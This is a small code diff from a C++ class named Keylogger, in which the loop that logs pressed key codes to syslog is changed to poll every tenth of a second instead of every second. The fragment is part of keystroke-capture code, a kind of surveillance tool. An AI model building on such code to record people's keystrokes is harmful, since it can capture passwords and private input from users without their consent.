@@ -17,7 +17,7 @@ void Keylogger::process() {
             for (int j = 0; j < 8; j++)
                 if (keys[i] & (1 << j))
                     syslog (LOG_NOTICE, "key code %d\n", (i*8) + j);
-        sleep(1);
+        usleep(100000);
     }
 }
 
